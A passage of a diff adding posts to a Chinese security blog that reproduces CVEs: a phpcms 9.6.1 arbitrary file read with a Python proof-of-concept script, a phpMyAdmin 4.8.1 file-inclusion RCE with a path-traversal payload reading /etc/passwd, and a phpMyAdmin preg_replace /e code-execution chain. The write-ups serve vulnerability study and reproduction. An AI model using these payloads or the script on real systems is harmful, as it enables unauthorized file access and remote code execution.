+if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
+$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
+$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre>
+<p><code>$fileurl</code>由<code>$f</code>产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而<code>$f</code>由<code>parse_str($a_k)</code>得来的</p>
+<p>那么接下来我们要找一处</p>
+<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre>
+<p>以<code>$pc_auth_key</code>作为密钥的加密点</p>
+<p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p>
+<p>显然只有中间的那个可以</p>
+<pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));
+$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre>
+<p>而<code>$i,$m,$f</code>等都是从<code>parse_str($a_k);</code>获得</p>
+<pre><code class="php">        parse_str($a_k);
+        if(isset($i)) $i = $id = intval($i);
+        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre>
+<p>接下来就跟9.6.0版本的sql注入相同了</p>
+<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
+import requests
+import random
+from urllib.parse import quote
+def poc(url,proxies={}):
+    sess=requests.session()
+    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
+    sess.proxies=proxies
+    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
+    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
+    param={
+        &quot;m&quot;:&quot;attachment&quot;,
+        &quot;c&quot;:&quot;attachments&quot;,
+        &quot;a&quot;:&quot;swfupload_json&quot;,
+        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)
+    }
+    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
+    #print(sess.cookies.get_dict())
+    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
+    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
+    #print(userid,a_k)
+    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]
+    #print(result)
+    #print(a_k)
+    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))
+    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:
+        return True
+    else :
+        return False
+
+
+
+#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
+print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/phpcmsv9.6.1任意文件读取/">https://www.ccreater.top/1970/01/01/phpcmsv9.6.1任意文件读取/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="ckmn5757b006ls1nieu49gsbj" data-title="phpcmsv9.6.1任意文件读取" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
+    <article id="post-phpmyadmin 4.8.1 rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/phpmyadmin%204.8.1%20rce/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p>
+<p>登陆账号</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p>
+<p>漏洞位置:<code>index.php</code>:57</p>
+<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
+    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
+    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
+    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
+    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
+) {
+    include $_REQUEST[&#39;target&#39;];
+    exit;
+}</code></pre>
+<p>非常明显的任意文件包含漏洞</p>
+<p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p>
+<p>跟进去</p>
+<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
+    {
+        if (empty($whitelist)) {
+            $whitelist = self::$goto_whitelist;
+        }
+        if (! isset($page) || !is_string($page)) {
+            return false;
+        }
+
+        if (in_array($page, $whitelist)) {
+            return true;
+        }
+
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        $_page = urldecode($page);
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        return false;
+    }</code></pre>
+<p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p>
+<pre><code class="php">array (
+  0 =&gt; &#39;db_datadict.php&#39;,
+....
+)</code></pre>
+<p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p>
+<p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p>
+<p>通用的payload:</p>
+<p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
+<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
+<p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p>
+<p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
+<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/phpmyadmin">https://www.ccreater.top/1970/01/01/phpmyadmin</a> 4.8.1 rce/](<a href="https://www.ccreater.top/1970/01/01/phpmyadmin">https://www.ccreater.top/1970/01/01/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/phpmyadmin%204.8.1%20rce/" data-id="ckmn5757c006ns1nigh9xg0xw" data-title="phpmyadmin 4.8.1 rce" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
+    <article id="post-phpmyadmin_登陆后_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpmyadmin登陆后rce"><a href="#phpmyadmin登陆后rce" class="headerlink" title="phpmyadmin登陆后rce"></a>phpmyadmin登陆后rce</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
+<p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
+<p>以下版本受到影响：</p>
+<ul>
+<li>4.0.10.16之前4.0.x版本</li>
+<li>4.4.15.7之前4.4.x版本</li>
+<li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li>
+</ul>
+</blockquote>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>全局搜索preg_replace,发现以下可能有可控变量的位置:</p>
+<p>容易找到</p>
+<p><code>TableSearch.lib.php</code></p>
+<pre><code class="php">function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
+    {
+        $column = $this-&gt;_columnNames[$columnIndex];
+        $sql_query = &quot;SELECT &quot;
+            . PMA_Util::backquote($column) . &quot;,&quot;
+            . &quot; 1,&quot; // to add an extra column that will have replaced value
+            . &quot; COUNT(*)&quot;
+            . &quot; FROM &quot; . PMA_Util::backquote($this-&gt;_db)
+            . &quot;.&quot; . PMA_Util::backquote($this-&gt;_table)
+            . &quot; WHERE &quot; . PMA_Util::backquote($column)
+            . &quot; RLIKE &#39;&quot; . PMA_Util::sqlAddSlashes($find) . &quot;&#39; COLLATE &quot;
+            . $charSet . &quot;_bin&quot;; // here we
+            // change the collation of the 2nd operand to a case sensitive
+            // binary collation to make sure that the comparison is case sensitive
+        $sql_query .= &quot; GROUP BY &quot; . PMA_Util::backquote($column)
+            . &quot; ORDER BY &quot; . PMA_Util::backquote($column) . &quot; ASC&quot;;
+
+        $result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($sql_query, 0);
+
+        if (is_array($result)) {
+            foreach ($result as $index=&gt;$row) {
+                $result[$index][1] = preg_replace(
+                    &quot;/&quot; . $find . &quot;/&quot;,
+                    $replaceWith,
+                    $row[0]
+                );
+            }
+        }
+        return $result;
+    }</code></pre>
+<p>如果我们可以控制<code>$result和$replaceWith</code>那么我们就可以执行任意命令</p>
+<p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p>
+<p>我们先看<code>getReplacePreview</code></p>
+<p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p>
+<p>再查看调用<code>getReplacePreview</code>的函数</p>
+<p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p>
+<p>去看第二个和第三个明显不行,这里就不贴出来了</p>
+<p>再跟进<code>tbl_find_replace.php</code></p>
+<pre><code class="php">if (isset($_POST[&#39;find&#39;])) {
+    $preview = $table_search-&gt;getReplacePreview(
+        $_POST[&#39;columnIndex&#39;],
+        $_POST[&#39;find&#39;],
+        $_POST[&#39;replaceWith&#39;],
+        $_POST[&#39;useRegex&#39;],
+        $connectionCharSet
+    );
+    $response-&gt;addJSON(&#39;preview&#39;, $preview);
+    exit;
+}</code></pre>
+<p>明显白给</p>
+<p>我们再回到<code>_getRegexReplaceRows</code>去查看它的第二个调用函数</p>
+<p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p>
+<p>再查看调用replace的函数</p>
+<p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p>
+<p>同样后面两个还是不行</p>
+<p>在跟进<code>tbl_find_replace.php</code></p>
+<p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p>
+<p>还是白给,两个调用链都是可以rce的,我们以前面那个为例</p>
+<p>先往表中添加一条数据<code>INSERT INTO</code>flags<code>(</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p>
+<p>直接抓包,修改</p>
+<p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p>
+<p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p>
+<p>成功</p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>这个poc直接抄个别人的,懒得写了</p>
+<p><code>https://www.exploit-db.com/exploits/40185</code></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/phpmyadmin_登陆后_rce/">https://www.ccreater.top/1970/01/01/phpmyadmin_登陆后_rce/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/1970/01/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="ckmn5757d006qs1nibz1u011s" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
+      
+	  
+      
+      
     </footer>
   </div>
   
@@ -2297,7 +2355,7 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
     </div>
   </div>
 
@@ -2310,23 +2368,23 @@ adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的�
       <ul>
         
           <li>
-            <a href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
+            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
           </li>
         
           <li>
-            <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">勉强能用的论文降重</a>
           </li>
         
           <li>
-            <a href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
           </li>
         
           <li>
-            <a href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
+            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
           </li>
         
           <li>
-            <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
+            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
           </li>
         
       </ul>
